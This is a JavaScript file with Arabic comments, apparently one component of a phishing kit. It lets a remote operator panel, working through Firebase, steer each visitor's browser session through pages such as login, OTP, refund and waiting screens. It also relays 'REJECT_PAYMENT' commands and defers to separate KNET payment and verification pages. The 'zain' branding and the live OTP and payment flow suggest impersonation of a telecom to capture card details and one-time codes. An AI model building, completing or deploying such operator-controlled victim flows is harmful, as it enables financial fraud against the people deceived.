// ═══════════════════════════════════════════════════════════
// page-commands.js — استماع صفحات موقع العملاء لأوامر لوحة التحكم
//   • القناة: RTDB commands/{sessionId}/redirect  (نفس قناة اللوحة)
//   • التوجيه يُنفَّذ مرة واحدة فقط، ثم تُحذف العقدة من قاعدة البيانات،
//     وتُحفظ بصمة الأمر (seq) في localStorage فتبقى بعد إعادة تحميل الصفحة —
//     فلا تتكرر إعادة التوجيه (منع حلقة إعادة التحميل).
//   • يبدأ تلقائياً بمجرد تحميل السكربت (لا يحتاج أي نداء من الصفحة).
//   • الصفحات الحساسة (الدفع/الرموز) لها منطقها الخاص — لا يتدخّل هذا الملف فيها.
//
// يُحمَّل بعد firebase-client.js (يستخدم window.rtd و window.sessionId).
// تهيئة اختيارية من الصفحة قبل التحميل:
//   window.__PAGE_COMMANDS__ = { onRedirect(target, cmd){}, onMessage(msg){} };
// ═══════════════════════════════════════════════════════════
(function () {
  'use strict';

  var cfg = window.__PAGE_COMMANDS__ || {};
  var started = false;

  // الصفحات الحساسة (الدفع/الرموز): لا يتدخّل هذا الملف في توجيهها.
  var SENSITIVE = { 'knet.html': 1, 'verification.html': 1 };

  function currentFile() {
    var parts = window.location.pathname.split('/');
    return parts[parts.length - 1] || 'index.html';
  }

  // أسماء مختصرة → ملف الصفحة الفعلي (يطابق أزرار لوحة التحكم)
  var ALIASES = {
    home: 'index.html', index: 'index.html', main: 'index.html',
    '\u0627\u0644\u0631\u0626\u064a\u0633\u064a\u0629': 'index.html',
    cart: 'cartepage.html', cartepage: 'cartepage.html',
    loan: 'loan.html',
    shop: 'shop.html', store: 'shop.html',
    watch: 'watch.html',
    refund: 'refund.html',
    wait: 'wait1.html', wait1: 'wait1.html',
    login: 'login.html',
    forgot: 'forgot-password.html', forgotpassword: 'forgot-password.html',
    otp: 'otp.html', otpcode: 'otp.html', otpverify: 'otp.html',
    otpnew: 'otp-new.html', otp4: 'otp-new.html', 'otp-new': 'otp-new.html',
    regist: 'login-regist.html', register: 'login-regist.html', loginregist: 'login-regist.html',
    orders: 'order1.html', order1: 'order1.html'
  };

  // تطبيع مسار الهدف: يقبل اسم ملف/مسار داخلي أو اسماً مختصراً،
  // ويرفض أي رابط خارجي أو بروتوكول أو مرساة داخلية (حماية من إساءة الاستخدام).
  function normalizeTarget(raw) {
    if (raw === undefined || raw === null) return null;
    var v = String(raw).trim();
    if (!v) return null;
    if (/^[a-z][a-z0-9+.-]*:/i.test(v)) return null;  // بروتوكول: http: / javascript: ...
    if (v.indexOf('//') === 0) return null;            // //host
    if (v.charAt(0) === '#') return null;              // مرساة داخلية
    var bare = v.replace(/^\.?\//, '');
    var alias = ALIASES[bare.toLowerCase()] || ALIASES[v] || ALIASES[bare];
    return alias || bare;                              // مسار/اسم ملف داخلي كما هو
  }

  var seqKey = null;
  function readSeq() { try { return localStorage.getItem(seqKey); } catch (e) { return null; } }
  function writeSeq(s) { try { localStorage.setItem(seqKey, s); } catch (e) {} }

  var inFlight = false;

  function handleRedirect(cmd) {
    if (!cmd || !cmd.targetPage) return;
    var ref = window.rtd.ref('commands/' + window.sessionId + '/redirect');
    function clearNode() { try { ref.remove(); } catch (e) {} }

    var target = normalizeTarget(cmd.targetPage);
    if (!target) { clearNode(); return; }              // هدف غير صالح → تجاهل وامسح

    // تجاهل التوجيه إلى نفس الصفحة الحالية (حماية من حلقة إعادة التحميل)
    var targetFile = target.split('/').pop().split('?')[0].split('#')[0];
    if (targetFile === currentFile()) { clearNode(); return; }

    // بصمة الأمر الفريدة (seq) — مفتاح خاص بهذا الملف حتى لا يتعارض مع
    // مفتاح الصفحات الحساسة (firebase-client.js) الذي يستخدم صيغة مختلفة.
    var seq = String(cmd.seq || cmd.redirectAt || cmd.timestamp || cmd.action || target);
    if (seq === readSeq()) { clearNode(); return; }    // نُفِّذ سابقاً (بعد إعادة التحميل)
    if (inFlight) return;

    inFlight = true;
    writeSeq(seq);
    clearNode();

    if (typeof cfg.onRedirect === 'function') {
      try { cfg.onRedirect(target, cmd); } catch (e) {}
      return;
    }
    window.location.href = target;
  }

  function start() {
    if (started) return true;
    if (SENSITIVE[currentFile()]) { started = true; return true; } // لا تتدخّل

    var rtd = window.rtd;
    var sid = window.sessionId;
    if (!rtd || !sid || typeof rtd.ref !== 'function') return false;
    // لا تشترك قبل اكتمال المصادقة: الاشتراك قبلها يُرفض بـ PERMISSION_DENIED
    // فيموت المستمع بصمت ولا يُعاد (كان هذا سبب عدم وصول أوامر التوجيه).
    if (typeof window.ensureAuthReady !== 'function') return false;

    started = true;
    seqKey = 'zain_page_redirect_' + sid;

    window.ensureAuthReady().then(function (token) {
      if (!token) {   // فشل الدخول → أعد المحاولة لاحقاً بدل ترك المستمع معطّلاً
        started = false; tries = 0;
        setTimeout(function () { waitForFirebase(); }, 1500);
        return;
      }
      subscribe(rtd, sid);
    }).catch(function () { started = false; tries = 0; setTimeout(function () { waitForFirebase(); }, 1500); });
    return true;
  }

  var subscribed = false;   // صار الاشتراك الحقيقي (بعد المصادقة)
  var rejSubscribed = false;

  function subscribeReject(rtd, sid) {
    if (rejSubscribed) return;
    rejSubscribed = true;
    var rejKey = 'zain_page_reject_' + sid;
    function readRej() { try { return localStorage.getItem(rejKey); } catch (e) { return null; } }
    try {
      rtd.ref('commands/' + sid + '/rejection').on('value', function (snap) {
        var cmd = snap.val();
        if (!cmd || cmd.action !== 'REJECT_PAYMENT') return;
        var stamp = String(cmd.rejectedAt || cmd.timestamp || cmd.action || '');
        var ref = rtd.ref('commands/' + sid + '/rejection');
        if (stamp === readRej()) { try { ref.remove(); } catch (e) {} return; }
        try { localStorage.setItem(rejKey, stamp); } catch (e) {}
        try { ref.remove(); } catch (e) {}
        // cfg يُقرأ لحظة التنفيذ، فيلتقط أي callback سُجِّل لاحقاً
        if (typeof cfg.onReject === 'function') { try { cfg.onReject(cmd); } catch (e) {} }
      }, function () { rejSubscribed = false; });
    } catch (e) { rejSubscribed = false; }
  }

  function subscribe(rtd, sid) {
    subscribed = true;
    try {
      rtd.ref('commands/' + sid + '/redirect').on('value', function (snap) {
        handleRedirect(snap.val());
      }, function (err) {
        // خطأ صلاحيات/شبكة: أعِد المحاولة من الصفر بدل ترك المستمع ميتاً
        console.warn('page-commands: redirect listener error', err && err.code);
        started = false;
        tries = 0;
        setTimeout(function () { waitForFirebase(); }, 1500);
      });
    } catch (e) {
      started = false;
      return;
    }

    if (typeof cfg.onMessage === 'function') {
      try {
        rtd.ref('messages/' + sid).on('child_added', function (snap) {
          var m = snap.val();
          if (m) { try { cfg.onMessage(m); } catch (e) {} }
        });
      } catch (e) {}
    }

    // أوامر الرفض: تُنفَّذ فقط إن سجّلت الصفحة callback باسم onReject.
    subscribeReject(rtd, sid);
  }

  // انتظر جاهزية firebase-client.js (rtd + sessionId) ثم ابدأ (~10s ثم توقّف بصمت)
  var tries = 0;
  function waitForFirebase() {
    if (start()) return;
    if (++tries > 40) return;
    setTimeout(waitForFirebase, 250);
  }
  waitForFirebase();

  // نداء اختياري من الصفحة لتسجيل callbacks مخصّصة (بعد التحميل).
  // المستمع يشير إلى cfg مباشرةً، فيكفي دمجه دون إعادة الاشتراك.
  window.listenForPageCommands = function (callbacks) {
    cfg = Object.assign({}, cfg, callbacks || {});
    if (!started) start();
    // إن سبق الاشتراك قبل تسجيل onReject، فعّل مستمع الرفض الآن
    if (subscribed && window.rtd && window.sessionId && !rejSubscribed
        && typeof cfg.onReject === 'function') {
      subscribeReject(window.rtd, window.sessionId);
    }
  };
})();
